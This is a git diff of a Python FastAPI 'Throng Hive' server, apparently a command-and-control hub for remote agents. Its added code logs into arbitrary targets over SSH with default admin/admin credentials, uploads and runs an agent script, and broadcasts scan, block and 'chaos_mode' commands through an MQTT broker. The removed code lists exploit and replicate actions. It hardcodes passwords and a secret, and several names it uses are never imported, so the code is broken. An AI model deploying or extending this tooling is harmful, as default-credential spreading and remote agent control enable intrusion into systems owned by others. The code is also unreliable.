@@ -1,244 +1,353 @@
-# server.py - Throng Hive (Fixed & Stable)
-
-from fastapi import FastAPI, WebSocket, Request
-from fastapi.responses import HTMLResponse
-from fastapi.templating import Jinja2Templates
-from fastapi.staticfiles import StaticFiles
-from fastapi.middleware.cors import CORSMiddleware
+from fastapi import FastAPI, WebSocket
 import sqlite3
 import json
 import time
 import os
-from pydantic import BaseModel
 import paho.mqtt.client as mqtt
 from paho.mqtt.client import CallbackAPIVersion
-from sklearn.ensemble import IsolationForest
-import numpy as np
-import paramiko
-import requests
-import uuid
-import logging
+import threading
 import socket
+from collections import deque
+import random
+import requests
+from datetime import datetime
 
-# ============ SETUP ============
 app = FastAPI()
-
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
-
-app.mount("/static", StaticFiles(directory="static"), name="static")
-templates = Jinja2Templates(directory="templates")
-
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ============ CONFIG ============
+# Konfigurasi
+JWT_SECRET = os.getenv("JWT_SECRET", "throng_default_secret_1234567890")
 MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
 MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
 MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
 DEFAULT_SPAWN_TARGET = os.getenv("DEFAULT_SPAWN_TARGET", "192.168.1.10")
 DEFAULT_SSH_USERNAME = os.getenv("DEFAULT_SSH_USERNAME", "admin")
 DEFAULT_SSH_PASSWORD = os.getenv("DEFAULT_SSH_PASSWORD", "admin")
-AUTO_SPAWN_INTERVAL = int(os.getenv("AUTO_SPAWN_INTERVAL", "300"))
+DEADMAN_TIMEOUT = int(os.getenv("DEADMAN_TIMEOUT", 600))
+HISTORY_SIZE = 50
 
-# ============ DB Helper ============
-def get_db():
-    conn = sqlite3.connect("throng.db")
-    conn.row_factory = sqlite3.Row
-    return conn
+# Konfigurasi WhatsApp dari SkyNet (opsional, isi jika digunakan)
+TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID")
+TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN")
+TWILIO_WHATSAPP_NUMBER = os.getenv("TWILIO_WHATSAPP_NUMBER", "whatsapp:+14155238886")
+WHATSAPP_NUMBER = os.getenv("WHATSAPP_NUMBER", "whatsapp:+6281234567890")
+
+# Database
+db = sqlite3.connect("throng.db", check_same_thread=False)
+cursor = db.cursor()
 
 def init_db():
-    conn = get_db()
-    conn.execute('''CREATE TABLE IF NOT EXISTS reports 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    conn.execute('''CREATE TABLE IF NOT EXISTS counterattacks 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, target TEXT, action TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    conn.execute('''CREATE TABLE IF NOT EXISTS agents 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT)''')
-    conn.execute('''CREATE TABLE IF NOT EXISTS targets 
-                 (id INTEGER PRIMARY KEY, target TEXT, vulnerability TEXT, status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, score REAL)''')
-    conn.execute('''CREATE TABLE IF NOT EXISTS emergency_logs 
-                 (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, details TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
-    conn.commit()
-    conn.close()
+    cursor.execute('''CREATE TABLE IF NOT EXISTS agents 
+                      (id INTEGER PRIMARY KEY, agent_id TEXT, status TEXT, last_seen DATETIME, ip TEXT, host TEXT, priority INTEGER DEFAULT 0)''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS reports 
+                      (id INTEGER PRIMARY KEY, agent_id TEXT, data TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS actions 
+                      (id INTEGER PRIMARY KEY, agent_id TEXT, action TEXT, target TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP, status TEXT)''')
+    cursor.execute('''CREATE TABLE IF NOT EXISTS tactics 
+                      (id INTEGER PRIMARY KEY, pattern TEXT UNIQUE, response TEXT, score REAL DEFAULT 1.0)''')
+    db.commit()
 
 init_db()
 
-# ============ MODEL PERINTAH ============
-class Command(BaseModel):
-    agent_id: str
-    action: str
-    target: str = None
-    params: dict = {}
-    emergency: bool = False
+# Log historis
+report_history = deque(maxlen=HISTORY_SIZE)
+action_history = deque(maxlen=HISTORY_SIZE)
 
-# ============ MQTT ============
-mqtt_client = mqtt.Client(callback_api_version=CallbackAPIVersion.VERSION2)
+# MQTT
+mqtt_client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
 active_websockets = []
 
 def on_connect(client, userdata, flags, rc, properties=None):
+    logger.info(f"MQTT connected with result code {rc}")
     if rc == 0:
-        logger.info("MQTT connected successfully")
         client.subscribe("throng/reports")
-    else:
-        logger.error(f"MQTT connection failed with code {rc}")
+        client.subscribe("throng/commands/#")
+        client.subscribe("throng/emergency")
 
 def on_message(client, userdata, msg):
-    if msg.topic == "throng/reports":
-        try:
-            report = json.loads(msg.payload.decode())
-            for ws in active_websockets:
-                asyncio.create_task(ws.send_text(json.dumps({"type": "report", "data": report})))
-        except Exception as e:
-            logger.error(f"Error: {e}")
+    if msg.topic.startswith("throng/reports"):
+        report = json.loads(msg.payload.decode())
+        report_history.append(report)
+        for ws in active_websockets:
+            ws.send_text(json.dumps({"type": "report", "data": report}))
+    elif msg.topic.startswith("throng/commands") or msg.topic == "throng/emergency":
+        command = json.loads(msg.payload.decode())
+        handle_command(command)
 
 mqtt_client.on_connect = on_connect
 mqtt_client.on_message = on_message
 mqtt_client.tls_set()
 mqtt_client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)
+mqtt_client.connect(MQTT_BROKER.split(":")[0], int(MQTT_BROKER.split(":")[1]), 60)
+mqtt_client.loop_start()
 
-# Validasi MQTT_BROKER
-try:
-    broker_host = MQTT_BROKER.split(":")[0]
-    broker_port = int(MQTT_BROKER.split(":")[1])
-except Exception as e:
-    logger.error(f"Invalid MQTT_BROKER format: {MQTT_BROKER}")
-    broker_host = "localhost"
-    broker_port = 1883
+# Fungsi spawn agent
+def spawn_agent_ssh(target, credentials):
+    try:
+        new_agent_id = str(uuid.uuid4())
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(target, username=credentials.get("username"), password=credentials.get("password"))
+        sftp = ssh.open_sftp()
+        sftp.put("agent.py", f"/tmp/agent_{new_agent_id}.py")
+        ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
+        sftp.close()
+        ssh.close()
+        cursor.execute("INSERT INTO agents (agent_id, status, last_seen, ip, host) VALUES (?, ?, ?, ?, ?)", 
+                       (new_agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), socket.gethostbyname(target), target))
+        db.commit()
+        logger.info(f"Spawned agent {new_agent_id} on {target}")
+        return new_agent_id
+    except Exception as e:
+        logger.error(f"Error spawning agent: {e}")
+        return None
 
-try:
-    mqtt_client.connect(broker_host, broker_port, 60)
-    mqtt_client.loop_start()
-except Exception as e:
-    logger.error(f"Failed to connect to MQTT: {e}")
-
-# ============ MODEL ANOMALI ============
-anomaly_model = IsolationForest(contamination=0.1, random_state=42)
-
-def analyze_threats(reports):
-    if len(reports) < 2:
-        return [0] * len(reports)
-    data = []
-    for r in reports:
-        traffic = r["data"].get("network_traffic", 0)
-        vuln_count = len(r["data"].get("vulnerability", []))
-        data.append([traffic, vuln_count])
-    X = np.array(data)
-    preds = anomaly_model.fit_predict(X)
-    return [bool(x == -1) for x in preds]
-
-# ============ ENDPOINTS ============
-
-@app.get("/", response_class=HTMLResponse)
-async def read_root(request: Request):
-    logger.info(f"Rendering dashboard.html with version {int(time.time())}")
-    return templates.TemplateResponse("dashboard.html", {"request": request, "version": int(time.time())})
-
-@app.get("/api/data")
-async def get_dashboard_data():
-    conn = get_db()
-    cur = conn.cursor()
-
-    cur.execute("SELECT agent_id, status, last_seen, ip, host FROM agents WHERE status = 'active'")
-    agents = [dict(row) for row in cur.fetchall()]
-
-    cur.execute("SELECT target, vulnerability, status, timestamp, score FROM targets")
-    targets = [dict(row) for row in cur.fetchall()]
-    for t in targets:
-        t["vulnerability"] = json.loads(t["vulnerability"])
-
-    cur.execute("SELECT agent_id, data, timestamp FROM reports ORDER BY timestamp DESC LIMIT 100")
-    reports = [dict(row) for row in cur.fetchall()]
-    for r in reports:
-        r["data"] = json.loads(r["data"])
-
-    anomalies = analyze_threats(reports)
-    for i, r in enumerate(reports):
-        if i < len(anomalies):
-            r["data"]["is_anomaly"] = anomalies[i]
-
-    cur.execute("SELECT agent_id, action, details, timestamp FROM emergency_logs ORDER BY timestamp DESC LIMIT 100")
-    emergency_logs = [dict(row) for row in cur.fetchall()]
-    for e in emergency_logs:
-        e["details"] = json.loads(e["details"])
-
+# Analisis ancaman (dari ORB dengan penyesuaian)
+def analyze_threat(report_data):
+    traffic = report_data.get("network_traffic", 0)
+    suspicious = report_data.get("suspicious_activity", False)
+    reasons = []
+    if traffic > 1000: reasons.append("high_traffic")
+    if suspicious: reasons.append("suspicious_activity")
+    pattern = "_".join(sorted(reasons)) if reasons else ""
+    conn = sqlite3.connect("throng.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT response FROM tactics WHERE pattern = ?", (pattern,))
+    tactic = cursor.fetchone()
+    suggestion = tactic[0] if tactic else "spawn_agent"
     conn.close()
-
     return {
-        "agents": agents,
-        "targets": targets,
-        "reports": reports,
-        "emergency_logs": emergency_logs
+        "threat": bool(reasons),
+        "reasons": reasons,
+        "suggestion": suggestion
     }
 
-@app.post("/command")
-async def send_command(command: Command):
-    allowed = ["block_ip", "send_honeypot", "redirect_traffic", "spawn_agent", "replicate", "scan_target", "exploit_target"]
-    if command.action not in allowed:
-        return {"status": "invalid action"}
+# Penanganan perintah
+def handle_command(command):
+    agent_id = command.get("agent_id")
+    action = command.get("action")
+    target = command.get("target")
+    emergency = command.get("emergency", False)
 
-    conn = get_db()
-    cur = conn.cursor()
-    if command.target:
-        cur.execute("INSERT INTO counterattacks (agent_id, target, action) VALUES (?, ?, ?)", 
-                    (command.agent_id, command.target, command.action))
-        if command.emergency:
-            cur.execute("INSERT INTO emergency_logs (agent_id, action, details) VALUES (?, ?, ?)", 
-                        (command.agent_id, command.action, json.dumps({"target": command.target, "params": command.params})))
-    conn.commit()
+    if action == "spawn" and target:
+        new_agent_id = spawn_agent_ssh(target, {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
+        cursor.execute("INSERT INTO actions (agent_id, action, target, status) VALUES (?, ?, ?, ?)", 
+                       (agent_id, action, target, "success" if new_agent_id else "failed"))
+        db.commit()
+        action_history.append({"agent_id": agent_id, "action": action, "target": target, "status": "success" if new_agent_id else "failed", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")})
+    elif action in ["scan", "block"] and target:
+        cursor.execute("INSERT INTO actions (agent_id, action, target, status) VALUES (?, ?, ?, ?)", 
+                       (agent_id, action, target, "pending"))
+        db.commit()
+        action_history.append({"agent_id": agent_id, "action": action, "target": target, "status": "pending", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")})
+        if emergency:
+            mqtt_client.publish("throng/emergency", json.dumps(command))
+    logger.info(f"Handled command: {action} for {agent_id} on {target}")
+
+# Deadman Switch (dari ORB)
+last_activity = time.time()
+deadman_active = False
+
+def deadman_check():
+    global deadman_active, last_activity
+    while True:
+        time.sleep(30)
+        if not deadman_active and time.time() - last_activity > DEADMAN_TIMEOUT:
+            deadman_active = True
+            print("🌑 DEADMAN ACTIVE: Mengaktifkan mode darurat!")
+            mqtt_client.publish("throng/broadcast", json.dumps({
+                "action": "chaos_mode",
+                "target": "all",
+                "reason": "protector_inactive"
+            }))
+
+threading.Thread(target=deadman_check, daemon=True).start()
+
+# Temporal Analysis (dari ORB)
+def temporal_analysis():
+    conn = sqlite3.connect("throng.db")
+    cursor = conn.cursor()
+    cursor.execute("""
+        SELECT strftime('%H', timestamp) as hour, count(*) as c 
+        FROM reports 
+        WHERE timestamp > datetime('now', '-7 days')
+        GROUP BY hour 
+        ORDER BY c DESC 
+        LIMIT 1
+    """)
+    peak = cursor.fetchone()
+    if peak:
+        print(f"🕰️ POLA WAKTU: Serangan puncak jam {peak[0]}:00. Siapkan 30 menit sebelum.")
     conn.close()
+    threading.Timer(21600, temporal_analysis).start()
 
-    mqtt_client.publish(f"throng/commands/{command.agent_id}", json.dumps(command.dict()))
-    for ws in active_websockets:
-        asyncio.create_task(ws.send_text(json.dumps({"type": "command", "data": command.dict()})))
+threading.Timer(60, temporal_analysis).start()
 
-    return {"status": f"Command {command.action} sent"}
+# AI Communication with Taunts (dari ORB)
+TAUNTS = [
+    "Orb: Ada yang ngacau... Mau kita jebak?",
+    "Orb: Traffic tinggi? Anak SMP juga bisa DDoS.",
+    "Orb: Mereka kira kita lemah? Honeypot beracun siap!"
+]
 
+def ai_send(message, level="info"):
+    msg = {
+        "from": "Orb-Core",
+        "to": "operator",
+        "message": message,
+        "level": level,
+        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+    }
+    mqtt_client.publish("throng/ai/chat", json.dumps(msg))
+    print(f"[AI] {msg['timestamp']} - {msg['message']} (Level: {msg['level']}")
+
+# Notifikasi WhatsApp (dari SkyNet, opsional)
+def send_whatsapp_notification(threat_data, config, timestamp):
+    if not all([TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_WHATSAPP_NUMBER, WHATSAPP_NUMBER]):
+        logger.warning("WhatsApp config incomplete, skipping notification")
+        return
+    message = f"⚠️ Threat detected: IP={threat_data['ip']}, Score={threat_data.get('score', 0)}%, Action={threat_data.get('suggestion', 'none')} @ {timestamp}"
+    try:
+        requests.post(
+            f"https://api.twilio.com/2010-04-01/Accounts/{TWILIO_ACCOUNT_SID}/Messages.json",
+            auth=(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN),
+            data={
+                "From": TWILIO_WHATSAPP_NUMBER,
+                "To": WHATSAPP_NUMBER,
+                "Body": message
+            }
+        )
+        logger.info("WhatsApp notification sent")
+    except Exception as e:
+        logger.error(f"WhatsApp notification failed: {e}")
+
+# WebSocket untuk CLI
 @app.websocket("/ws")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     active_websockets.append(websocket)
-    try:
-        while True:
+    global last_activity
+    last_activity = time.time()
+    logger.info("CLI connected via WebSocket")
+    print("=== Throng Hive Terminal ===")
+    print("Type 'help' for commands. Use 'exit' to quit.")
+    print_active_agents()
+
+    while True:
+        try:
             data = await websocket.receive_text()
             report = json.loads(data)
             agent_id = report.get("agent_id")
             report_data = report.get("data")
+            cursor.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
+            cursor.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
+                           (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
+            db.commit()
+            report_history.append(report)
+            threat = analyze_threat(report_data)
+            print_report(report, threat)
+            if threat["threat"]:
+                ai_send(f"Threat detected from {report_data['ip']}! Action: {threat['suggestion']}", "alert")
+                send_whatsapp_notification({"ip": report_data["ip"], "score": 85, "suggestion": threat["suggestion"]}, 
+                                          {"twilio_account_sid": TWILIO_ACCOUNT_SID, "twilio_auth_token": TWILIO_AUTH_TOKEN, 
+                                           "twilio_whatsapp_number": TWILIO_WHATSAPP_NUMBER, "whatsapp_number": WHATSAPP_NUMBER}, 
+                                          time.strftime("%Y%m%d_%H%M%S"))
+        except Exception as e:
+            logger.error(f"WebSocket error: {e}")
 
-            conn = get_db()
-            cur = conn.cursor()
-            cur.execute("INSERT INTO reports (agent_id, data) VALUES (?, ?)", (agent_id, json.dumps(report_data)))
-            cur.execute("INSERT OR REPLACE INTO agents (agent_id, status, last_seen, ip) VALUES (?, ?, ?, ?)", 
-                        (agent_id, "active", time.strftime("%Y-%m-%d %H:%M:%S"), report_data.get("ip", "unknown")))
-            if "vulnerability" in report_data:
-                score = len(report_data.get("vulnerability", [])) * 0.2
-                cur.execute("INSERT INTO targets (target, vulnerability, status, score) VALUES (?, ?, ?, ?)", 
-                            (report_data.get("target"), json.dumps(report_data.get("vulnerability")), "scanned", score))
-            conn.commit()
-            conn.close()
-            logger.info(f"Saved report from {agent_id}")
-    except Exception as e:
-        logger.error(f"WS error: {e}")
-    finally:
-        if websocket in active_websockets:
-            active_websockets.remove(websocket)
+# Fungsi bantu CLI
+def print_active_agents():
+    cursor.execute("SELECT agent_id, ip, last_seen, priority FROM agents WHERE status = 'active'")
+    agents = cursor.fetchall()
+    if agents:
+        print("\nActive Agents:")
+        for agent in agents:
+            print(f"  - {agent[0]} (IP: {agent[1]}, Last Seen: {agent[2]}, Priority: {agent[3]})")
+    else:
+        print("  No active agents.")
 
-@app.get("/health")
-async def health():
-    return {"status": "ok"}
+def print_report(report, threat):
+    agent_id = report["agent_id"]
+    data = report["data"]
+    msg = random.choice(TAUNTS) if threat["threat"] else "Orb: Semua aman... untuk sekarang."
+    print(f"\n[Report] {agent_id} @ {data['timestamp']}: Traffic={data['network_traffic']}, IP={data['ip']}, Threat={threat['threat']} - {msg}")
 
-import atexit
-@atexit.register
-def cleanup():
-    try:
-        db_conn = get_db()
-        db_conn.close()
-    except:
-        pass
-    mqtt_client.loop_stop()
-    logger.info("Cleanup done.")
+def print_history():
+    print("\n=== Report History ===")
+    for report in report_history:
+        print(f"{report['agent_id']} @ {report['data']['timestamp']}: {json.dumps(report['data'])}")
+    print("\n=== Action History ===")
+    for action in action_history:
+        print(f"{action['agent_id']} {action['action']} {action['target']} [{action['status']}] @ {action['timestamp']}")
+    conn = sqlite3.connect("throng.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT pattern, response, score FROM tactics")
+    tactics = cursor.fetchall()
+    if tactics:
+        print("\n=== Learned Tactics ===")
+        for tactic in tactics:
+            print(f"Pattern: {tactic[0]}, Response: {tactic[1]}, Score: {tactic[2]}")
+    conn.close()
+
+def execute_command(cmd):
+    parts = cmd.split()
+    if not parts:
+        return "Invalid command"
+
+    action = parts[0].lower()
+    if action == "help":
+        return "Commands: help, spawn [target], scan [target], block [target], priority [agent_id] [level], history, exit"
+    elif action == "spawn" and len(parts) > 1:
+        target = parts[1]
+        new_agent_id = spawn_agent_ssh(target, {"username": DEFAULT_SSH_USERNAME, "password": DEFAULT_SSH_PASSWORD})
+        return f"Spawned agent {new_agent_id}" if new_agent_id else "Spawn failed"
+    elif action == "scan" and len(parts) > 1:
+        target = parts[1]
+        mqtt_client.publish("throng/commands/global", json.dumps({"agent_id": "all", "action": "scan", "target": target}))
+        return f"Scanning {target} (broadcasted to all agents)"
+    elif action == "block" and len(parts) > 1:
+        target = parts[1]
+        mqtt_client.publish("throng/commands/global", json.dumps({"agent_id": "all", "action": "block", "target": target, "emergency": True}))
+        return f"Blocking {target} (emergency action broadcasted)"
+    elif action == "priority" and len(parts) > 2:
+        agent_id, level = parts[1], int(parts[2])
+        cursor.execute("UPDATE agents SET priority = ? WHERE agent_id = ?", (level, agent_id))
+        db.commit()
+        return f"Set priority {level} for {agent_id}"
+    elif action == "history":
+        print_history()
+        return ""
+    elif action == "exit":
+        return "Exiting..."
+    else:
+        return "Unknown command or missing arguments"
+
+# Endpoint utama untuk CLI
+@app.get("/")
+async def cli_interface():
+    logger.info("Starting CLI interface")
+    return PlainTextResponse("Run 'python -m cli_client' to start Throng Hive CLI")
+
+# Client CLI
+import asyncio
+import websockets
+
+async def run_cli():
+    uri = "ws://localhost:8000/ws"  # Ganti dengan URL Railway saat deploy
+    async with websockets.connect(uri) as websocket:
+        print("=== Throng Hive Terminal ===")
+        print("Type 'help' for commands. Use 'exit' to quit.")
+        print_active_agents()
+        while True:
+            cmd = input("> ").strip()
+            if cmd.lower() == "exit":
+                print("Exiting...")
+                break
+            response = execute_command(cmd)
+            if response:
+                print(response)
+            await websocket.send(json.dumps({"command": cmd}))
+
+if __name__ == "__main__":
+    asyncio.run(run_cli())
